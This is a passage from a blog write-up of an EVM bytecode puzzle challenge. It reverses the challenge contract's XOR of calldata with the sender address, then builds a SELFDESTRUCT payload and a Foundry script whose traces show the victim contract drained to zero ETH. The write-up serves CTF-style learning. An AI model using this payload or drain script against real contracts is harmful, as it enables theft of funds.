</span></span><span class=line><span class=cl><span class=o>|------------------|-------------------------------------------|</span>
</span></span><span class=line><span class=cl><span class=mi>61000080600</span><span class=n>a3d393df300000000000000000000000000000000000000000000</span>
</span></span><span class=line><span class=cl>                   <span class=o>^</span>
</span></span></code></pre></td></tr></table></div></div><p>The <em><code>CALLDATACOPY</code></em> is used to <strong>copy</strong> the data into the memory here (all the data is copied).</p><p><figure><a class=lightgallery href=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%203.png title=Untitled data-thumbnail=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%203.png data-sub-html="<h2>evm.codes CALLDATACOPY</h2><p>Untitled</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%203.png data-srcset="/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%203.png, /posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%203.png 1.5x, /posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%203.png 2x" data-sizes=auto alt=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%203.png width=2536 height=120></a><figcaption class=image-caption>evm.codes CALLDATACOPY</figcaption></figure></p><p>So this will copy the data to the offset <strong>10</strong>. (e.g : screenshots & explanation below).</p><ul><li>Before <code>CALLDATACOPY</code> this is what looks like the memory.</li></ul><p><figure><a class=lightgallery href=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%204.png title=Untitled data-thumbnail=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%204.png data-sub-html="<h2>Forge Debugger before the CallDataCopy</h2><p>Untitled</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%204.png data-srcset="/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%204.png, /posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%204.png 1.5x, /posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%204.png 2x" data-sizes=auto alt=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%204.png width=3740 height=698></a><figcaption class=image-caption>Forge Debugger before the CallDataCopy</figcaption></figure></p><ul><li>After <code>CALLDATACOPY</code> here the <u>size</u> is 0x20 because the <a href=https://www.notion.so/TwitterChallenge-Puzzle-ByteCode-f31ba85c800f4c42a469490f9c2378c0 target=_blank rel="noopener noreffer">real payload</a> is <strong>32</strong> bytes (0x20 = 32).</li></ul><p><figure><a class=lightgallery href=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%205.png title=Untitled data-thumbnail=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%205.png data-sub-html="<h2>Forge Debugger after the CallDataCopy</h2><p>Untitled</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%205.png data-srcset="/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%205.png, /posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%205.png 1.5x, /posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%205.png 2x" data-sizes=auto alt=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%205.png width=3548 height=612></a><figcaption class=image-caption>Forge Debugger after the CallDataCopy</figcaption></figure></p><p>Now, we have to dive into the weird math operation… Here, I was confused with the output of the decompiler. But lucky for me, I was already familiar with this kind of <u>xor pattern</u> → <a href="https://www.youtube.com/watch?v=FaxLEwj4fW8" target=_blank rel="noopener noreffer">Reversing & crackme on x86 (PleaseSubscribe)</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=n>v1</span> <span class=o>=</span> <span class=n>v2</span> <span class=o>=</span> <span class=mi>1</span> <span class=o>+</span> <span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>data</span><span class=p>.</span><span class=n>length</span> <span class=o>-</span> <span class=mi>1</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>MEM</span><span class=p>[</span><span class=mi>10</span> <span class=o>+</span> <span class=p>(</span><span class=n>v2</span> <span class=o>-</span> <span class=n>v1</span> <span class=o>&lt;&lt;</span> <span class=mi>5</span><span class=p>)]</span> <span class=o>=</span> <span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>|</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>&lt;&lt;</span> <span class=mi>160</span><span class=p>)</span> <span class=o>^</span> <span class=n>MEM</span><span class=p>[</span><span class=mi>10</span> <span class=o>+</span> <span class=p>(</span><span class=n>v2</span> <span class=o>-</span> <span class=n>v1</span> <span class=o>&lt;&lt;</span> <span class=mi>5</span><span class=p>)];</span>
</span></span><span class=line><span class=cl>            <span class=n>v1</span> <span class=o>=</span> <span class=n>v1</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=o>!</span><span class=n>v1</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>So I guessed it.. was a <u>xor byte per byte operation</u> by the pattern. We will use the <em>foundry debugger</em> to confirm.</p><p>First, we need to generate some values to prove it.</p><p>Let’s use python here:</p><p><figure><a class=lightgallery href=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%206.png title="Using python to generate the payload." data-thumbnail=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%206.png data-sub-html="<h2>Generating 0x41 on 32 bytes</h2><p>Using python to generate the payload.</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%206.png data-srcset="/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%206.png, /posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%206.png 1.5x, /posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%206.png 2x" data-sizes=auto alt=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%206.png width=1428 height=140></a><figcaption class=image-caption>Generating 0x41 on 32 bytes</figcaption></figure></p><p>Now, we can add the value using the <code>hex</code> as previous.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=kt>bytes</span> <span class=k>memory</span> <span class=nb>data</span> <span class=o>=</span> <span class=s>hex&#34;4141414141414141414141414141414141414141414141414141414141414141&#34;</span><span class=p>;</span> <span class=c1>// hexadecimal string
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>victim</span><span class=p>.</span><span class=nb>call</span><span class=p>{</span> <span class=nb>gas</span><span class=o>:</span> <span class=mi>1</span><span class=n>_000_000</span> <span class=p>}(</span><span class=nb>data</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>And now, if we move to the <u>xor operation</u> with the <em>foundry debugger</em>.<figure><a class=lightgallery href=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%207.png title="Debugger xor math operation" data-thumbnail=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%207.png data-sub-html="<h2>Foundry Debugger showing the XOR operation</h2><p>Debugger xor math operation</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%207.png data-srcset="/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%207.png, /posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%207.png 1.5x, /posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%207.png 2x" data-sizes=auto alt=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%207.png width=3754 height=540></a><figcaption class=image-caption>Foundry Debugger showing the XOR operation</figcaption></figure></p><p>This is the case!!And now, we need to use the right opcodes to not revert and execute a full self-destruct on our address to getback the ETH</p><h3 id=4-selfdestruct>4. SELFDESTRUCT</h3><div class="details admonition tip open"><div class="details-summary admonition-title"><i class="icon fas fa-lightbulb fa-fw" aria-hidden=true></i>SELFDESTRUCT<i class="details-icon fas fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><p><code>SELFDESTRUCT</code> will destroy and send <strong>all</strong> the <em>ETH</em> to a <strong>arbitrary</strong> address.</p><p>The <code>SELFDESTRUCT</code> opcode is <code>0xFF</code>.</p></div></div></div><p>Let’s use <a href=http://evm.codes target=_blank rel="noopener noreffer">evm.codes</a> to know how to use <code>SELFDESTRUCT</code> ⬇️</p><p><figure><a class=lightgallery href=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%208.png title=Untitled data-thumbnail=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%208.png data-sub-html="<h2>evm.codes SELFDESTRUCT</h2><p>Untitled</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%208.png data-srcset="/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%208.png, /posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%208.png 1.5x, /posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%208.png 2x" data-sizes=auto alt=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%208.png width=2508 height=114></a><figcaption class=image-caption>evm.codes SELFDESTRUCT</figcaption></figure></p><p>So our plan, will be :<br>1 - <code>PUSH</code> our address on the <u>stack</u>.</p><p>2 - Call the <code>SELFDESTRUCT</code>.</p><p>3 - Call <code>STOP</code> to stop the execution?</p><p>Ok, we need to push our address using <code>PUSH20</code> for 20 bytes (because addresses are in <strong>uint160</strong>).</p><p>So, it will looks like something like:</p><p><figure><a class=lightgallery href=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%209.png title=Untitled data-thumbnail=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%209.png data-sub-html="<h2>EVM Playground our malicious opcode</h2><p>Untitled</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%209.png data-srcset="/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%209.png, /posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%209.png 1.5x, /posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%209.png 2x" data-sizes=auto alt=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/Untitled%209.png width=2442 height=936></a><figcaption class=image-caption>EVM Playground our malicious opcode</figcaption></figure></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=n>PUSH20</span><span class=p>(</span><span class=mh>0x5b73c5498c1e3b4dba84de0f1833c4a029d90519</span><span class=p>)</span>   <span class=o>|</span> <span class=mh>0xF3</span>
</span></span><span class=line><span class=cl><span class=n>SELFDESTRUCT</span><span class=p>()</span>                                       <span class=o>|</span> <span class=mh>0xFF</span>
</span></span><span class=line><span class=cl><span class=n>STOP</span>                                                 <span class=o>|</span> <span class=mh>0x00</span>
</span></span></code></pre></td></tr></table></div></div><p>The final payload is:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=mi>735</span><span class=n>b73c5498c1e3b4dba84de0f1833c4a029d90519FF00</span>
</span></span></code></pre></td></tr></table></div></div><p>Now we have the payload we need to make win the challenge!
However, we have to reminder the xor operation!
So using python one last time we can xor our payload with the key.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=nb>hex</span><span class=p>(</span><span class=mh>0xba84de0f1833c4a029d905195b73c5498c1e3b4dba84de</span> <span class=o>^</span> <span class=mh>0x735b73c5498c1e3b4dba84de0f1833c4a029d90519FF00</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=s1>&#39;0xc9dfadca51bfda9b646381c7546bf68d2c37e248a37bde&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>And we got our <strong>final payload</strong>!!! <code>0xc9dfadca51bfda9b646381c7546bf68d2c37e248a37bde</code>
Let&rsquo;s execute this one into on ETH mainnet!</p><h3 id=5-proof-of-concept--results>5. Proof of Concept & Results</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Traces:
</span></span><span class=line><span class=cl>  <span class=o>[</span>112757<span class=o>]</span> CounterScript::run<span class=o>()</span>
</span></span><span class=line><span class=cl>    ├─ <span class=o>[</span>0<span class=o>]</span> VM::deal<span class=o>(</span>CounterScript: <span class=o>[</span>0x5b73C5498c1E3b4dbA84de0F1833c4a029d90519<span class=o>]</span>, 1000000000000000000<span class=o>)</span>
</span></span><span class=line><span class=cl>    │   └─ ← <span class=o>()</span>
</span></span><span class=line><span class=cl>    ├─ emit log_string<span class=o>(</span>:  ----------------------- Before Attack ----------------------------------<span class=o>)</span>
</span></span><span class=line><span class=cl>    ├─ emit log_named_uint<span class=o>(</span>key: Balance of the contract, val: 1000000000000000000<span class=o>)</span>
</span></span><span class=line><span class=cl>    ├─ emit log_named_uint<span class=o>(</span>key: Balance of the victim, val: 100000000000000000<span class=o>)</span>
</span></span><span class=line><span class=cl>    ├─ <span class=o>[</span>22173<span class=o>]</span> 0xA0Eb20483Cb60213bF944c2C3833bebc9fbc4706::fallback<span class=o>{</span>value: 100000000000000000<span class=o>}()</span>
</span></span><span class=line><span class=cl>    │   └─ ← <span class=o>()</span>
</span></span><span class=line><span class=cl>    ├─ <span class=o>[</span>0<span class=o>]</span> VM::warp<span class=o>(</span>1672353711<span class=o>)</span>
</span></span><span class=line><span class=cl>    │   └─ ← <span class=o>()</span>
</span></span><span class=line><span class=cl>    ├─ <span class=o>[</span>43904<span class=o>]</span> 0xA0Eb20483Cb60213bF944c2C3833bebc9fbc4706::c9dfadca<span class=o>(</span>51bfda9b646381c7546bf68d2c37e248a37bde0f1833c4a029d90519<span class=o>)</span>
</span></span><span class=line><span class=cl>    │   ├─ <span class=o>[</span>6422<span class=o>]</span> → new &lt;Unknown&gt;@0x37a9B80AcC6A434d4E29D8873BaB9E471cb0d244
</span></span><span class=line><span class=cl>    │   │   └─ ← <span class=m>32</span> bytes of code
</span></span><span class=line><span class=cl>    │   ├─ <span class=o>[</span>5003<span class=o>]</span> 0x37a9B80AcC6A434d4E29D8873BaB9E471cb0d244::fallback<span class=o>()</span> <span class=o>[</span>delegatecall<span class=o>]</span>
</span></span><span class=line><span class=cl>    │   │   └─ ← <span class=o>()</span>
</span></span><span class=line><span class=cl>    │   └─ ← <span class=o>()</span>
</span></span><span class=line><span class=cl>    ├─ emit log_string<span class=o>(</span>:  ----------------------- After Attack ----------------------------------<span class=o>)</span>
</span></span><span class=line><span class=cl>    ├─ emit log_named_uint<span class=o>(</span>key: Balance of the contract, val: 1100000000000000000<span class=o>)</span>
</span></span><span class=line><span class=cl>    ├─ emit log_named_uint<span class=o>(</span>key: Balance of the victim, val: 0<span class=o>)</span>
</span></span><span class=line><span class=cl>    └─ ← <span class=o>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Script ran successfully.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>==</span> <span class=nv>Logs</span> <span class=o>==</span>
</span></span><span class=line><span class=cl>   ----------------------- Before Attack ----------------------------------
</span></span><span class=line><span class=cl>  Balance of the contract: <span class=m>1000000000000000000</span>
</span></span><span class=line><span class=cl>  Balance of the victim: <span class=m>100000000000000000</span>
</span></span><span class=line><span class=cl>   ----------------------- After Attack ----------------------------------
</span></span><span class=line><span class=cl>  Balance of the victim: <span class=m>0</span>
</span></span></code></pre></td></tr></table></div></div><p>Voila! The victim contract is now holding <strong>0 ETH</strong>! We drained all the eth from the contract :)</p><p>Don’t hesitate to join us on discord, we are building a InfoSec web3 community 🔥 with CTFs.</p><h3 id=6-socials--payload>6. Socials & Payload</h3><table><thead><tr><th>Discord (Join us!)</th><th>Github</th><th>Twitter</th></tr></thead><tbody><tr><td><a href=https://discord.gg/54Q9pnpQcV target=_blank rel="noopener noreffer">https://discord.gg/54Q9pnpQcV</a></td><td><a href=https://github.com/Ethnical/Swek3 target=_blank rel="noopener noreffer">https://github.com/Ethnical/Swek3</a></td><td><a href=https://twitter.com/EthnicalInfo target=_blank rel="noopener noreffer">https://twitter.com/EthnicalInfo</a></td></tr></tbody></table><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=n>The</span> <span class=n>payload</span> <span class=n>used</span> <span class=n>not</span> <span class=n>_clean</span> <span class=p>(</span><span class=n>yet</span><span class=p>)</span><span class=k>_</span><span class=o>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>```</span><span class=n>solidity</span>
</span></span><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>13</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;forge-std/Script.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;forge-std/Test.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>CounterScript</span> <span class=k>is</span> <span class=n>Script</span><span class=p>,</span> <span class=n>Test</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kd>function</span> <span class=nf>setUp</span><span class=p>()</span> <span class=k>public</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kd>function</span> <span class=nf>run</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>vm</span><span class=p>.</span><span class=n>deal</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=mi>1</span> <span class=kc>ether</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=kt>address</span> <span class=n>victim</span> <span class=o>=</span> <span class=mh>0xA0Eb20483Cb60213bF944c2C3833bebc9fbc4706</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=kt>string</span> <span class=k>memory</span> <span class=n>victim_addr</span> <span class=o>=</span> <span class=s>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=n>emit</span> <span class=n>log_string</span><span class=p>(</span><span class=s>&#34; ----------------------- Before Attack ----------------------------------&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>emit</span> <span class=n>log_named_uint</span><span class=p>(</span><span class=s>&#34;Balance of the contract&#34;</span><span class=p>,</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>).</span><span class=nb>balance</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>emit</span> <span class=n>log_named_uint</span><span class=p>(</span><span class=s>&#34;Balance of the victim&#34;</span><span class=p>,</span> <span class=kt>address</span><span class=p>(</span><span class=n>victim</span><span class=p>).</span><span class=nb>balance</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=kt>bytes</span> <span class=k>memory</span> <span class=nb>data</span> <span class=o>=</span> <span class=s>hex&#34;c9dfadca51bfda9b646381c7546bf68d2c37e248a37bde0f1833c4a029d90519&#34;</span><span class=p>;</span> <span class=c1>// hexadecimal payload xored.
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=n>victim</span><span class=p>.</span><span class=nb>call</span><span class=p>{</span> <span class=nb>value</span><span class=o>:</span> <span class=mi>0</span><span class=p>.</span><span class=mi>1</span> <span class=kc>ether</span> <span class=p>}(</span><span class=s>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>vm</span><span class=p>.</span><span class=n>warp</span><span class=p>(</span><span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span> <span class=o>+</span> <span class=mi>10000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>victim</span><span class=p>.</span><span class=nb>call</span><span class=p>{</span> <span class=nb>gas</span><span class=o>:</span> <span class=mi>1</span><span class=n>_000_000</span> <span class=p>}(</span><span class=nb>data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>emit</span> <span class=n>log_string</span><span class=p>(</span><span class=s>&#34; ----------------------- After Attack ----------------------------------&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>emit</span> <span class=n>log_named_uint</span><span class=p>(</span><span class=s>&#34;Balance of the contract&#34;</span><span class=p>,</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>).</span><span class=nb>balance</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>emit</span> <span class=n>log_named_uint</span><span class=p>(</span><span class=s>&#34;Balance of the victim&#34;</span><span class=p>,</span> <span class=kt>address</span><span class=p>(</span><span class=n>victim</span><span class=p>).</span><span class=nb>balance</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Challenge Code EVM codes for retrying the challenge!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=o>**</span><span class=mh>0x4861707079204e65772059656172204576657279626f647921212121212121346100ab573354803d1090421116610034573d3dfd5b69414e65f7405358584fd360801b1860801c60b01b3660e81b016000525a600a3601363d600a373360a01b331760206001360304600101805b808203602002600a01805184189052600190038061006d575050503d3df03d808080936100a0566920434f4e475241545a205b636861645d95f43d3df35b426363b0beef036469696969690234116100c3573d3dfd5b42610fff0133553d3df3</span><span class=o>**</span>
</span></span></code></pre></td></tr></table></div></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2022-12-30</span></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/index.md target=_blank>Read Markdown</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Twitter" data-sharer=twitter data-url=http://example.org/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/ data-title="Challenge Twitter - EVM Puzzles & selfdestruct" data-via="map[prefix:https://twitter.com/ title:Twitter weight:3]" data-hashtags="PoC,EVM,Low-level,Reverse Engineerng,selfdestruct"><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Facebook" data-sharer=facebook data-url=http://example.org/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/ data-hashtag=PoC><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=http://example.org/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/ data-title="Challenge Twitter - EVM Puzzles & selfdestruct"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=http://example.org/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/ data-title="Challenge Twitter - EVM Puzzles & selfdestruct"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=http://example.org/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/ data-title="Challenge Twitter - EVM Puzzles & selfdestruct"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/poc/>PoC</a>,&nbsp;<a href=/tags/evm/>EVM</a>,&nbsp;<a href=/tags/low-level/>Low-level</a>,&nbsp;<a href=/tags/reverse-engineerng/>Reverse Engineerng</a>,&nbsp;<a href=/tags/selfdestruct/>selfdestruct</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/firstpost/ class=prev rel=prev title="Theme Documentation - Basics"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>Theme Documentation - Basics</a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.110.0">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank></a></span></div></div></footer></div><div 